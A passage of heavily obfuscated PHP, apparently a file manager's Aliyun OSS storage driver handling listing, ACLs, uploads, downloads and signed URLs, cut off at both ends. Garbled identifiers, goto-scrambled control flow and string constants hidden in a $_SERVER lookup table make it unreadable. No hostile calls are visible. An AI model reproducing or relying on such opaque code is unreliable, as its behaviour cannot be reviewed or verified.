$dÈ—ô¼Ö¿ˆ[77]); if ($E±‰Óó) { return $E¼à¤Ÿ; } goto D¦‚ù”œ¸­; f¼°Í‚‚È’: } public function listPath($bÃˆ¡Ï·Ï‘, $AÔàŞÜ‡— = false) { $bÁ¢Ñğ¸Ë =& $_SERVER[›èö’ù¤]; $D‰¬±°œ»¾ = $this->fileList($bÃˆ¡Ï·Ï‘, $bÁ¢Ñğ¸Ë[8], !0); foreach ($D‰¬±°œ»¾[$bÁ¢Ñğ¸Ë[75]] as $Bí¥ï‰ÂÆè => $e»Ù‡„Ìå®) { $D‰¬±°œ»¾[$bÁ¢Ñğ¸Ë[75]][$Bí¥ï‰ÂÆè] = $this->folderInfo($e»Ù‡„Ìå®, $AÔàŞÜ‡—, $e»Ù‡„Ìå®); } foreach ($D‰¬±°œ»¾[$bÁ¢Ñğ¸Ë[74]] as $Bí¥ï‰ÂÆè => $e»Ù‡„Ìå®) { $D‰¬±°œ»¾[$bÁ¢Ñğ¸Ë[74]][$Bí¥ï‰ÂÆè] = $this->fileInfo($e»Ù‡„Ìå®[$bÁ¢Ñğ¸Ë[28]], $AÔàŞÜ‡—, $e»Ù‡„Ìå®); } return $D‰¬±°œ»¾; } public function has($FŠ½Ö¡ñ, $d‹Ã¨±¿´ = false, $Fâ¦Ó«ÏÔÁ = true) { goto BÔ”‚†Ëì; e¹‚øƒä†: $c°‹åæ¹’™ = $E†”ƒğ°¢[33]; $c½ÙƒÍØæ = 500; $Bùìİ¨«õÇ = $c‘Ë¾Ğ±º = 0; goto BÜ†ÁŸƒ×; BÜ†ÁŸƒ×: while (!0) { check_abort(); $CßİºŠ‡ˆ½ = array($E†”ƒğ°¢[1295] => $E†”ƒğ°¢[8], $E†”ƒğ°¢[1296] => $CÂòíù‚•‡, $E†”ƒğ°¢[1297] => $c½ÙƒÍØæ, $E†”ƒğ°¢[1298] => $c°‹åæ¹’™); try { $b‰ğß¦Èï = $this->client->listObjects($this->bucket, $CßİºŠ‡ˆ½); } catch (OSS\Core\OssException $aöóĞºî×ë) { break; } $c°‹åæ¹’™ = $b‰ğß¦Èï->getNextMarker(); $A®‘É¾àÆ = $b‰ğß¦Èï->getObjectList(); $c‡ğÇè»ò = $b‰ğß¦Èï->getPrefixList(); if ($d‹Ã¨±¿´) { if (count($A®‘É¾àÆ) > 1 || count($A®‘É¾àÆ) == 1 && $A®‘É¾àÆ[0]->getKey() != $CÂòíù‚•‡) { $Bùìİ¨«õÇ += count($A®‘É¾àÆ) - 1; } if (!empty($c‡ğÇè»ò)) { $c‘Ë¾Ğ±º += count($c‡ğÇè»ò); } if ($c°‹åæ¹’™ === $E†”ƒğ°¢[33]) { break; } continue; } if ($Fâ¦Ó«ÏÔÁ) { if (!empty($A®‘É¾àÆ)) { if (count($A®‘É¾àÆ) > 1 || $A®‘É¾àÆ[0]->getKey() != $CÂòíù‚•‡) { return !0; } } } else { if (!empty($c‡ğÇè»ò)) { return !0; } } if ($c°‹åæ¹’™ === $E†”ƒğ°¢[33]) { break; } } if ($d‹Ã¨±¿´) { return array($E†”ƒğ°¢[203] => $Bùìİ¨«õÇ, $E†”ƒğ°¢[204] => $c‘Ë¾Ğ±º); } return !1; goto fµ ”Ø‚†Á; BÔ”‚†Ëì: $E†”ƒğ°¢ =& $_SERVER[›èö’ù¤]; $FŠ½Ö¡ñ = trim($FŠ½Ö¡ñ, $E†”ƒğ°¢[8]); $CÂòíù‚•‡ = empty($FŠ½Ö¡ñ) && $FŠ½Ö¡ñ !== $E†”ƒğ°¢[191] ? $E†”ƒğ°¢[33] : $FŠ½Ö¡ñ . $E†”ƒğ°¢[8]; goto e¹‚øƒä†; fµ ”Ø‚†Á: } public function listAll($C£öÀÔœÑ) { $d³¢µ’¥¶£ =& $_SERVER[›èö’ù¤]; $e•ø÷ïª‚š = $this->fileList($C£öÀÔœÑ, $d³¢µ’¥¶£[33], !0); $cª•çœ‡° = array(); foreach ($e•ø÷ïª‚š[$d³¢µ’¥¶£[74]] as $Cö®íÏ§¦) { $cª•çœ‡°[$Cö®íÏ§¦[$d³¢µ’¥¶£[28]]] = $Cö®íÏ§¦[$d³¢µ’¥¶£[78]]; } foreach ($e•ø÷ïª‚š[$d³¢µ’¥¶£[75]] as $Cö®íÏ§¦) { if (is_string($Cö®íÏ§¦)) { $cª•çœ‡°[$Cö®íÏ§¦] = 0; } } return $this->listAllFiles($C£öÀÔœÑ, array_keys($cª•çœ‡°), $cª•çœ‡°); } public function canRead($Dİ‹ƒ“‰ã) { $dñ÷‹Ø¤Áá =& $_SERVER[›èö’ù¤]; $fáÜÕ»§çÎ = $this->pathAcl($Dİ‹ƒ“‰ã); return $fáÜÕ»§çÎ == $dñ÷‹Ø¤Áá[1308] || $fáÜÕ»§çÎ == $dñ÷‹Ø¤Áá[545] ? !0 : !1; } public function canWrite($fô¢¼Äø) { $EÃ›íÄÈ¿ = $this->pathAcl($fô¢¼Äø); return $EÃ›íÄÈ¿ == $_SERVER[›èö’ù¤][545] ? !0 : !1; } public function pathAcl($dÛÀªÃõ) { goto CŠéä¬‡Ô×; CŠéä¬‡Ô×: $EÛÄ·æµî =& $_SERVER[›èö’ù¤]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $däÄ–¢Êá = $this->client->getObjectAcl($this->bucket, $this->pathEncode($dÛÀªÃõ)); } catch (OSS\Core\OssException $E«™êƒèÛÕ) { return !1; } goto cˆ£…‘š„; cˆ£…‘š„: $bÙœÀˆ™´’ = $däÄ–¢Êá == $EÛÄ·æµî[34] ? $this->bucketAcl : $däÄ–¢Êá; if ($bÙœÀˆ™´’ == $EÛÄ·æµî[1309]) { return $EÛÄ·æµî[1308]; } if ($bÙœÀˆ™´’ == $EÛÄ·æµî[1310]) { return $EÛÄ·æµî[545]; } goto Eö‹ÂÔÌãâ; Eö‹ÂÔÌãâ: return $bÙœÀˆ™´’; goto b‘åÚ³â’œ; b‘åÚ³â’œ: } private function chmodPath($B‚¸ï®ğª¡, $Cğî¸¾ù‹ = '') { $D×÷ˆ×¯ =& $_SERVER[›èö’ù¤]; $B²¡¨à¾Ìâ = empty($Cğî¸¾ù‹) ? $D×÷ˆ×¯[1310] : $Cğî¸¾ù‹; $d¾Ûà÷Õ™• = array($D×÷ˆ×¯[34], $D×÷ˆ×¯[192], $D×÷ˆ×¯[1309], $D×÷ˆ×¯[1310]); if (!in_array($B²¡¨à¾Ìâ, $d¾Ûà÷Õ™•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($B‚¸ï®ğª¡), $B²¡¨à¾Ìâ); } catch (OSS\Core\OssException $Cè¢ÃÁ÷Ï¤) { return !1; } return !0; } public function getContent($Aéïê¨óÏš) { return $this->fileSubstr($Aéïê¨óÏš, -1); } public function setContent($a ñË°İÂÄ, $Eœ˜ÁÜò = '') { $Cè¶ƒš•Šƒ =& $_SERVER[›èö’ù¤]; try { $dİ¼Âõß¡´ = $this->trafficLimit($Cè¶ƒš•Šƒ[1311]); $F¤Ê«£¬Æ· = $this->client->putObject($this->bucket, $this->pathEncode($a ñË°İÂÄ), $Eœ˜ÁÜò, $dİ¼Âõß¡´); } catch (OSS\Core\OssException $F £ƒõª°) { return !1; } $c‘”âé·³” = array($Cè¶ƒš•Šƒ[1301] => trim($F¤Ê«£¬Æ·[$Cè¶ƒš•Šƒ[1312]], $Cè¶ƒš•Šƒ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a ñË°İÂÄ))); $this->updateObjMeta($a ñË°İÂÄ, $c‘”âé·³”); return isset($F¤Ê«£¬Æ·[$Cè¶ƒš•Šƒ[1313]][$Cè¶ƒš•Šƒ[1260]]) ? !0 : !1; } private function updateObjMeta($cØàßÚÑæ¶, $FÆ½ÏÑ¿áõ) { $cØàßÚÑæ¶ = $this->pathEncode($cØàßÚÑæ¶); try { $f¥¥èÆ„ê = array(OSS\OssClient::OSS_HEADERS => $FÆ½ÏÑ¿áõ); $this->client->copyObject($this->bucket, $cØàßÚÑæ¶, $this->bucket, $cØàßÚÑæ¶, $f¥¥èÆ„ê); } catch (OSS\Core\OssException $cêâ×¼ÚÀ™) { return !1; } return !0; } public function upload($F‚¨à¨²•, $E²ØØ´İŠ—, $f¥‡Ô´øÛ  = false, $f‡ÓñÕôÂˆ = REPEAT_REPLACE) { $a‹–»‘Ê‡£ =& $_SERVER[›èö’ù¤]; $F¯Ô”³ÜŸå = trim($F‚¨à¨²•, $a‹–»‘Ê‡£[8]); $C·¼ÁÓƒÃß = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a‹–»‘Ê‡£[1301] => @md5_file($E²ØØ´İŠ—)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F‚¨à¨²•))); $C·¼ÁÓƒÃß = $this->trafficLimit($a‹–»‘Ê‡£[1311], $C·¼ÁÓƒÃß); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($F¯Ô”³ÜŸå), $E²ØØ´İŠ—, $C·¼ÁÓƒÃß); } catch (OSS\Core\OssException $CŒ–Ò¶Ì±°) { return !1; } return $this->getPathOuter($F‚¨à¨²•); } public function getHost() { $DÎ‚´¯Üˆì =& $_SERVER[›èö’ù¤]; $fÒ›¹İ‚²ˆ = explode($DÎ‚´¯Üˆì[177], parent::getHost()); return $fÒ›¹İ‚²ˆ[0] . $DÎ‚´¯Üˆì[177] . $this->bucket . $DÎ‚´¯Üˆì[95] . $fÒ›¹İ‚²ˆ[1]; } public function uploadFormData($dƒÒ«õ‘¹É, $A—­¢Â¸İŠ = 3600) { goto B´ˆã©õá‰; Aµ¸Ûµæîß: $aé†÷¦‡ = strpos($b”Ã¥·•¢, $eŠ¶Îè¬¾„[294]); $b”Ã¥·•¢ = substr($b”Ã¥·•¢, 0, $aé†÷¦‡) . $eŠ¶Îè¬¾„[1315]; $b¯åÇ »‚È = 1048576000 * 5; goto dé¹“ñŠ²›; B´ˆã©õá‰: $eŠ¶Îè¬¾„ =& $_SERVER[›èö’ù¤]; if (!($F¢ÓÉŒ»á× = $this->getHost())) { return !1; } $aªê©íí°Ï = $A—­¢Â¸İŠ; goto AÏ¬§öÊÁ†; f»Õ¼¿ñï…: $B°“’§ËÉ§ = base64_encode(hash_hmac($eŠ¶Îè¬¾„[230], $CšÁÑ Ÿ²Ö, $this->secret, !0)); $dÆ‚â‡‰íÑ = array($eŠ¶Îè¬¾„[1225] => $CšÁÑ Ÿ²Ö, $eŠ¶Îè¬¾„[1317] => $this->accessKey, $eŠ¶Îè¬¾„[1221] => $eŠ¶Îè¬¾„[1213], $eŠ¶Îè¬¾„[1318] => $B°“’§ËÉ§, $eŠ¶Îè¬¾„[175] => $F¢ÓÉŒ»á×); $dÆ‚â‡‰íÑ = $this->trafficLimit($eŠ¶Îè¬¾„[1311], $dÆ‚â‡‰íÑ); goto f›ÕÒßŞŸ; AÏ¬§öÊÁ†: $f±¯Æ”Í¨ = date($eŠ¶Îè¬¾„[1314], time() + $aªê©íí°Ï); $A„ËœùãÜ• = new DateTime($f±¯Æ”Í¨); $b”Ã¥·•¢ = $A„ËœùãÜ•->format(DateTime::ISO8601); goto Aµ¸Ûµæîß; dé¹“ñŠ²›: $aò¼õ´‹¨ = $this->pathFather($dƒÒ«õ‘¹É); $eÔÉ‹İ‡Ø§ = array($eŠ¶Îè¬¾„[1215] => $b”Ã¥·•¢, $eŠ¶Îè¬¾„[1216] => array(array($eŠ¶Îè¬¾„[1316], 0, $b¯åÇ »‚È), array($eŠ¶Îè¬¾„[1219], $eŠ¶Îè¬¾„[1220], $aò¼õ´‹¨))); $CšÁÑ Ÿ²Ö = base64_encode(json_encode($eÔÉ‹İ‡Ø§)); goto f»Õ¼¿ñï…; f›ÕÒßŞŸ: return $dÆ‚â‡‰íÑ; goto CÄ†±¢‹Êƒ; CÄ†±¢‹Êƒ: } public function multiUploadFormData($F¨ñ£ö·ë, $f˜Ì„¡Ê = 3600) { $d“›»”®¯ö =& $_SERVER[›èö’ù¤]; if (!($e†ÔŒÛ—¨ = $this->getHost())) { return !1; } $aÂ¹‡ä¨ô = $this->trafficLimit($d“›»”®¯ö[1311]); $aÏ‘á¸·•¤ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F¨ñ£ö·ë), $aÂ¹‡ä¨ô); return array($d“›»”®¯ö[221] => $aÏ‘á¸·•¤, $d“›»”®¯ö[175] => $e†ÔŒÛ—¨ . $d“›»”®¯ö[8] . $this->pathEncode($F¨ñ£ö·ë), $d“›»”®¯ö[222] => gmdate($d“›»”®¯ö[1319]), $d“›»”®¯ö[93] => $F¨ñ£ö·ë); } public function multiUploadAuthData($cùÎ×ƒê®, $f¸ÇÇ½— = array()) { goto CÓÔŸÖØ¶; B ·Íö‘Ò: $f©Õƒ­ì¤ø = $c§ÀÑ‹µ…Ş[1285] . $this->accessKey . $c§ÀÑ‹µ…Ş[4] . $D¯Éâï™¦ì; if (strpos($dÆôÑ×êŒ, $c§ÀÑ‹µ…Ş[225]) === 0) { $f©Õƒ­ì¤ø = array($c§ÀÑ‹µ…Ş[232] => $f©Õƒ­ì¤ø, $c§ÀÑ‹µ…Ş[222] => $dÓØÆ‘Ä Ú); if ($b™Æß‡èÓ´) { $f©Õƒ­ì¤ø = array_merge($f©Õƒ­ì¤ø, $b™Æß‡èÓ´); } } return $f©Õƒ­ì¤ø; goto Fß…ÜËùÀè; Dê¢É¡ùîœ: $D¿ô£À¬ñİ = $cùÎ×ƒê®; if (isset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[93]])) { $D¿ô£À¬ñİ = $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[93]]; unset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[93]]); } if (isset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[223]])) { $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[222]] = $dÓØÆ‘Ä Ú; return $this->listUploadParts($D¿ô£À¬ñİ, $f¸ÇÇ½—); } goto Aëì£•˜‹‹; b†ßŞ—×¿: if (!empty($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[1321]])) { $eñÔ¨š¿‰è = array_merge(array($fŞÂÃÑÆ–[4]), $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[1321]]); sort($eñÔ¨š¿‰è); $fŞÂÃÑÆ–[4] = implode($c§ÀÑ‹µ…Ş[229], $eñÔ¨š¿‰è); } $då„İÏ²ïö = implode($c§ÀÑ‹µ…Ş[229], $fŞÂÃÑÆ–); $D¯Éâï™¦ì = base64_encode(hash_hmac($c§ÀÑ‹µ…Ş[230], $då„İÏ²ïö, $this->secret, !0)); goto B ·Íö‘Ò; Aëì£•˜‹‹: $fŞÂÃÑÆ– = array($c§ÀÑ‹µ…Ş[224], $c§ÀÑ‹µ…Ş[33], $c§ÀÑ‹µ…Ş[119], $dÓØÆ‘Ä Ú, "\170\55\x6f\163\163\55\144\x61\164\x65\72{$dÓØÆ‘Ä Ú}", $c§ÀÑ‹µ…Ş[8] . $this->bucket . $c§ÀÑ‹µ…Ş[8] . $D¿ô£À¬ñİ . $dÆôÑ×êŒ); if (strpos($dÆôÑ×êŒ, $c§ÀÑ‹µ…Ş[225]) === 0) { $fŞÂÃÑÆ–[0] = $c§ÀÑ‹µ…Ş[226]; if ($b™Æß‡èÓ´ = $this->trafficLimit($c§ÀÑ‹µ…Ş[1311])) { $D¿ô£À¬ñİ = $c§ÀÑ‹µ…Ş[1320]; array_splice($fŞÂÃÑÆ–, 5, 0, $D¿ô£À¬ñİ . $c§ÀÑ‹µ…Ş[4] . $b™Æß‡èÓ´[$D¿ô£À¬ñİ]); } } if (isset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[227]]) && $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[227]] == $c§ÀÑ‹µ…Ş[228]) { $fŞÂÃÑÆ–[0] = $c§ÀÑ‹µ…Ş[228]; } goto b†ßŞ—×¿; CÓÔŸÖØ¶: $c§ÀÑ‹µ…Ş =& $_SERVER[›èö’ù¤]; $dÓØÆ‘Ä Ú = isset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[222]]) ? $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[222]] : gmdate($c§ÀÑ‹µ…Ş[1319]); $dÆôÑ×êŒ = isset($f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[168]]) ? $f¸ÇÇ½—[$c§ÀÑ‹µ…Ş[168]] : $c§ÀÑ‹µ…Ş[33]; goto Dê¢É¡ùîœ; Fß…ÜËùÀè: } public function listUploadParts($eØÏŞº˜Î, $B¥òñ¢ãó’) { goto bÖ»é­éÊÛ; bõÓÄ„°Ó: unset($B¥òñ¢ãó’[$bĞÈ¨Œİ«‚[223]], $B¥òñ¢ãó’[$bĞÈ¨Œİ«‚[227]]); $E«¦Éâ×Ş = $this->multiUploadAuthData($eØÏŞº˜Î, $B¥òñ¢ãó’); if (empty($E«¦Éâ×Ş)) { return !1; } goto d¾öíÏ¬; bç©èô…á¬: $fš °¼Ô¼ƒ = $e ¨œÛÛ¡->getListPart(); $cŸ¿ƒÇòç = array(); foreach ($fš °¼Ô¼ƒ as $aéã…¢å¨) { $cŸ¿ƒÇòç[] = array($bĞÈ¨Œİ«‚[1305] => $aéã…¢å¨->getPartNumber(), $bĞÈ¨Œİ«‚[1306] => trim($aéã…¢å¨->getETag(), $bĞÈ¨Œİ«‚[116])); } goto bõÓÄ„°Ó; bÖ»é­éÊÛ: $bĞÈ¨Œİ«‚ =& $_SERVER[›èö’ù¤]; $e¿•´ùÆ½ = parse_url_query($B¥òñ¢ãó’[$bĞÈ¨Œİ«‚[168]]); $e ¨œÛÛ¡ = $this->client->listParts($this->bucket, $this->pathEncode($eØÏŞº˜Î), $e¿•´ùÆ½[$bĞÈ¨Œİ«‚[221]]); goto bç©èô…á¬; d¾öíÏ¬: return array($bĞÈ¨Œİ«‚[232] => $E«¦Éâ×Ş, $bĞÈ¨Œİ«‚[222] => $B¥òñ¢ãó’[$bĞÈ¨Œİ«‚[222]], $bĞÈ¨Œİ«‚[234] => $cŸ¿ƒÇòç); goto bÅÃ¸‰ó¼˜; bÅÃ¸‰ó¼˜: } public function download($b¢Ï¢ÉòË, $c¶¡‹¹¶Ò) { if ($this->isFolder($b¢Ï¢ÉòË)) { return !1; } try { $C½¤¿‰›•Ä = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $c¶¡‹¹¶Ò); $C½¤¿‰›•Ä = $this->trafficLimit($_SERVER[›èö’ù¤][109], $C½¤¿‰›•Ä); $this->client->getObject($this->bucket, $this->pathEncode($b¢Ï¢ÉòË), $C½¤¿‰›•Ä); } catch (OSS\Core\OssException $DÉ³Ú˜Ôï) { return !1; } return $c¶¡‹¹¶Ò; } public function fileSubstr($C½† ¸ÕŞ‰, $cÒ½ºÖŒÛ¥ = 0, $Cš‘ö³Áó¤ = false) { if ($cÒ½ºÖŒÛ¥ === -1) { $Fùø±ÄÊá† = array(); } else { if ($Cš‘ö³Áó¤ === !1) { $b½Ó·ìÛ¦ç = $this->size($C½† ¸ÕŞ‰); } else { $b½Ó·ìÛ¦ç = $cÒ½ºÖŒÛ¥ + $Cš‘ö³Áó¤ - 1; } $Fùø±ÄÊá† = array(OSS\OssClient::OSS_RANGE => "{$cÒ½ºÖŒÛ¥}\x2d{$b½Ó·ìÛ¦ç}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($C½† ¸ÕŞ‰), $Fùø±ÄÊá†); } catch (OSS\Core\OssException $EœëîÙ¥´) { think_exception($EœëîÙ¥´->getMessage()); return !1; } } private function trafficLimit($AÇˆ“Š¶ÑÃ, $C†ÙºÉÅÔ° = array()) { goto Eì‹¢¤Â–À; Eì‹¢¤Â–À: $fğ®Ïâİå =& $_SERVER[›èö’ù¤]; if ($AÇˆ“Š¶ÑÃ == $fğ®Ïâİå[1311] && $this->isUploadServer() || $AÇˆ“Š¶ÑÃ == $fğ®Ïâİå[109] && $this->isFileOutServer()) { return $C†ÙºÉÅÔ°; } $Eå½¿†ï¦ä = floatval($GLOBALS[$fğ®Ïâİå[6]][$fğ®Ïâİå[88]][$fğ®Ïâİå[107]][$AÇˆ“Š¶ÑÃ]) * 1024 * 1024 * 8; goto CĞ¡á®Ö˜â; cµ«½ª™ÈÖ: return $C†ÙºÉÅÔ°; goto a¥‰¶ÀÂÖ×; CĞ¡á®Ö˜â: if (!$Eå½¿†ï¦ä) { return $C†ÙºÉÅÔ°; } $Eå½¿†ï¦ä = $Eå½¿†ï¦ä < 819200 ? 819200 : ($Eå½¿†ï¦ä > 838860800 ? 838860800 : $Eå½¿†ï¦ä); $C†ÙºÉÅÔ°[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Eå½¿†ï¦ä); goto cµ«½ª™ÈÖ; a¥‰¶ÀÂÖ×: } public function link($d°åéÕ›ö¼, $e“ĞÛÍƒ‹Ì = array()) { $F¸ç‘Ìí¾† =& $_SERVER[›èö’ù¤]; if (!$this->exist($d°åéÕ›ö¼) || $this->isFolder($d°åéÕ›ö¼)) { return !1; } try { $e“ĞÛÍƒ‹Ì = $this->trafficLimit($F¸ç‘Ìí¾†[109], $e“ĞÛÍƒ‹Ì); $D«„ÃÜÁÛÓ = $this->client->signUrl($this->bucket, $this->pathEncode($d°åéÕ›ö¼), 3600 * 12, $F¸ç‘Ìí¾†[228], $e“ĞÛÍƒ‹Ì); return $this->getCdnLink($D«„ÃÜÁÛÓ); } catch (OSS\Core\OssException $eäÑãÂÄ¦Õ) { return !1; } } public function fileOut($fÉÎáİ¸ß¸, $a»®˜¡ƒ¨À = false, $c›ğ´ğù®Ì = false, $CßêÏùáîŠ = '') { goto dêÓ®Ø¦²; dÇÎÆÒµÏÛ: $c¥ÓÚë‡Û = $this->link($fÉÎáİ¸ß¸, $Aä…ˆÉ‘ä); $this->fileOutLink($c¥ÓÚë‡Û); goto dÛšº¢ÇË; dêÓ®Ø¦²: $D¬ğ´ğïİ =& $_SERVER[›èö’ù¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($fÉÎáİ¸ß¸, $a»®˜¡ƒ¨À, $c›ğ´ğù®Ì, $CßêÏùáîŠ); } if (!$c›ğ´ğù®Ì) { $c›ğ´ğù®Ì = $this->pathThis($fÉÎáİ¸ß¸); } goto fôù—º¶˜ ; fôù—º¶˜ : $c›ğ´ğù®Ì = rawurlencode($c›ğ´ğù®Ì); $Aáì¢´¹˜¿ = get_file_mime(get_path_ext($c›ğ´ğù®Ì)); if ($Aáì¢´¹˜¿ == $D¬ğ´ğïİ[213]) { return parent::fileOut($fÉÎáİ¸ß¸, $a»®˜¡ƒ¨À, $c›ğ´ğù®Ì, $CßêÏùáîŠ); } goto CãƒŸøË©ˆ; CãƒŸøË©ˆ: $a»®˜¡ƒ¨À = $a»®˜¡ƒ¨À ? $D¬ğ´ğïİ[214] : $D¬ğ´ğïİ[215]; $Aä…ˆÉ‘ä = array(OSS\OssClient::OSS_SUB_RESOURCE => $D¬ğ´ğïİ[1322] . rawurlencode("{$a»®˜¡ƒ¨À}\x3b\146\x69\154\x65\156\141\155\145\75{$c›ğ´ğù®Ì}")); $Aä…ˆÉ‘ä[OSS\OssClient::OSS_SUB_RESOURCE] .= $D¬ğ´ğïİ[1323] . rawurlencode($Aáì¢´¹˜¿); goto dÇÎÆÒµÏÛ; dÛšº¢ÇË: } public function fileOutServer($e¸¹¨¯‡Ì®, $CìÊššÖ¨š = false, $fŠœ–Î… É = false, $c—’ˆ·óÛ = '') { parent::fileOut($e¸¹¨¯‡Ì®, $CìÊššÖ¨š, $fŠœ–Î… É, $c—’ˆ·óÛ); } public function fileOutImage($F¬òà³©ƒ½, $eÓÀ×äßÎà = 250) { $A§¦´ç×œ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[›èö’ù¤][1324] . $eÓÀ×äßÎà); $F’ğó‡òêĞ = $this->link($F¬òà³©ƒ½, $A§¦´ç×œ); $this->fileOutLink($F’ğó‡òêĞ); } public function fileOutImageServer($dÙ•¯à÷ù›, $eöÊĞÚÚ›„ = 250) { parent::fileOutImage($dÙ•¯à÷ù›, $eöÊĞÚÚ›„); } public function fileOutLink($CëÓÑ»ì) { $dë Ù‹‘ÜÖ =& $_SERVER[›èö’ù¤]; if (!$this->isCdnHost() && substr($CëÓÑ»ì, 0, 7) == $dë Ù‹‘ÜÖ[1228]) { $CëÓÑ»ì = $dë Ù‹‘ÜÖ[1229] . substr($CëÓÑ»ì, 7); } header($dë Ù‹‘ÜÖ[159] . $CëÓÑ»ì); die; } public function hashMd5($c¸œ„‰‰áù, $bÅŒ¹«·¯ = '') { $E³î­‚æÃ³ =& $_SERVER[›èö’ù¤]; $dñ‚ÖïÔö = $this->_objectMeta($c¸œ„‰‰áù); if (!$dñ‚ÖïÔö) { return $E³î­‚æÃ³[33]; } if (!isset($dñ‚ÖïÔö[$E³î­‚æÃ³[1301]]) && !empty($bÅŒ¹«·¯)) { $A¬ÆÂ‘™óÑ = $this->updateObjMeta($c¸œ„‰‰áù, array($E³î­‚æÃ³[1301] => $bÅŒ¹«·¯)); $dñ‚ÖïÔö[$E³î­‚æÃ³[1301]] = $A¬ÆÂ‘™óÑ ? $bÅŒ¹«·¯ : $E³î­‚æÃ³[33]; } return isset($dñ‚ÖïÔö[$E³î­‚æÃ³[1301]]) ? strtolower($dñ‚ÖïÔö[$E³î­‚æÃ³[1301]]) : $E³î­‚æÃ³[33]; } public function size($cÚ»’¾ÑÔÊ) { $C¿¦º¥Ÿƒ = $this->objectMeta($cÚ»’¾ÑÔÊ); return $C¿¦º¥Ÿƒ ? $C¿¦º¥Ÿƒ[$_SERVER[›èö’ù¤][78]] : 0; } public function info($C³µ¬èÂ¾ë) { if ($this->isFolder($C³µ¬èÂ¾ë)) { return $this->folderInfo($C³µ¬èÂ¾ë); } else { if ($this->isFile($C³µ¬èÂ¾ë)) { return $this->fileInfo($C³µ¬èÂ¾ë); } } return !1; } public function exist($cˆ×¥õÏäÅ) { return $this->isFile($cˆ×¥õÏäÅ) || $this->isFolder($cˆ×¥õÏäÅ); } public function isFile($aóÛÑ÷×ÔÛ) { return !$this->isFolder($aóÛÑ÷×ÔÛ) && $this->objectMeta($aóÛÑ÷×ÔÛ); } public function isFolder($e“ˆÍë½œÊ) { return $this->cacheMethod($_SERVER[›èö’ù¤][199], $e“ˆÍë½œÊ); } protected function objectMeta($C»ÍÁ’¥£Ô) { return $this->cacheMethod($_SERVER[›èö’ù¤][200], $C»ÍÁ’¥£Ô); } protected function _objectMeta($bñ£ñİÕ›¡) { $Dá–„µ½ó =& $_SERVER[›èö’ù¤]; try { $C«‘ïˆ æ¶ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($bñ£ñİÕ›¡)); } catch (OSS\Core\OssException $C¥¤„ÓÃš) { $C«‘ïˆ æ¶ = !1; } if ($C«‘ïˆ æ¶) { $C«‘ïˆ æ¶[$Dá–„µ½ó[78]] = intval($C«‘ïˆ æ¶[$Dá–„µ½ó[1299]]); } return $C«‘ïˆ æ¶; } protected function _isFolder($cË½®İ…œÅ) { $då‹º×á°ø =& $_SERVER[›èö’ù¤]; if ($cË½®İ…œÅ == $då‹º×á°ø[33] || $cË½®İ…œÅ == $då‹º×á°ø[8]) { return !0; } $cÜˆ“ëÆÖ = array($då‹º×á°ø[1295] => $då‹º×á°ø[8], $då‹º×á°ø[1296] => rtrim($cË½®İ…œÅ, $då‹º×á°ø[8]) . $då‹º×á°ø[8], $då‹º×á°ø[1297] => 1, $då‹º×á°ø[1298] => $då‹º×á°ø[33]); $Cğ¯ÈºÏÄÎ = $this->client->listObjects($this->bucket, $cÜˆ“ëÆÖ); if ($Cğ¯ÈºÏÄÎ->getObjectList() || $Cğ¯ÈºÏÄÎ->getPrefixList()) { return !0; } return !1; } } goto EÂ¯—ËÕÒ–; DŞ·¼å¹§Ö: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($f††ë¢õíÊ) { $this->pathParse = $f††ë¢õíÊ; $this->model = Model($_SERVER[›èö’ù¤][1230]); } public function getPath($Ašª¨Ø†’›) { return trim($Ašª¨Ø†’›, $_SERVER[›èö’ù¤][8]); } public function pathFather($eƒ½êÂö®) { $E˜‡ŞÓÊ° = $this->parse($eƒ½êÂö®); $E˜‡ŞÓÊ° = $this->infoSimple($eƒ½êÂö®); return $E˜‡ŞÓÊ° ? $E˜‡ŞÓÊ°[$_SERVER[›èö’ù¤][493]] : !1; } public function pathThis($b¦¨Â¸ˆÑÁ) { $F¾¹ò…È¸— = $this->infoSimple($b¦¨Â¸ˆÑÁ); return $F¾¹ò…È¸— ? $F¾¹ò…È¸—[$_SERVER[›èö’ù¤][28]] : !1; } public function getPathOuter($e’³–¿‡¡) { if (!$e’³–¿‡¡) { return $e’³–¿‡¡; } $E¿ÍÊ”¹çÊ = $this->parse($e’³–¿‡¡); return KodIO::make($E¿ÍÊ”¹çÊ[$_SERVER[›èö’ù¤][395]]); } public function copyFolderFromIO($aÖÌé§Ñ´«, $bé¦¹ù–Æ©, $CŸäÜ³Ãå , $DĞÑÑº¢é˜, $E§õÕôé„—) { $däÊºáÕ’ = $this->model->copyFolderFromIO($aÖÌé§Ñ´«, $bé¦¹ù–Æ©, $CŸäÜ³Ãå , $DĞÑÑº¢é˜, $E§õÕôé„—); return KodIO::make($däÊºáÕ’); } public function isParentOf($eĞ…† ì, $F¾åç¸Ã¦) { return $this->model->isParentOf($eĞ…† ì, $F¾åç¸Ã¦); } public function 